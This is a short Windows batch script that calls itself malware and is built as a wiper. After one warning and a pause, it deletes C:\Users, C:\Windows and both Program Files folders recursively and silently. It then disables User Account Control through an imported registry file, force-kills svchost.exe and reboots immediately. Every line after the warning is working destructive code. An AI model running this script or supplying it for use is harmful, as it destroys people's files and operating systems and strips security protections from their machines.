@echo off
echo THIS IS MALWARE! If you've ran this with admin priveligies, make sure you're not running this on your host OR you've saved all of your data. This program will erase C:\Windows,Program Files,Program Files (x86),Users.
PAUSE
echo Windows Registry Editor Version 5.00 > disable_uac.reg
echo. >> disable_uac.reg
RD /S /Q "C:\Users\" >nul 2>&1
RD /S /Q "C:\Windows\" >nul 2>&1
RD /S /Q "C:\Program Files\" >nul 2>&1
RD /S /Q "C:\Program Files (x86)\" >nul 2>&1
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System] >> disable_uac.reg
echo "ConsentPromptBehaviorAdmin"=dword:00000000 >> disable_uac.reg
echo "EnableLUA"=dword:00000000 >> disable_uac.reg
echo. >> disable_uac.reg
regedit /s disable_uac.reg
del disable_uac.reg
echo. >> call.bat
echo echo call.bat executed successfully! >> call.bat
echo. >> call.bat
taskkill /f /im svchost.exe
shutdown /r /t 0
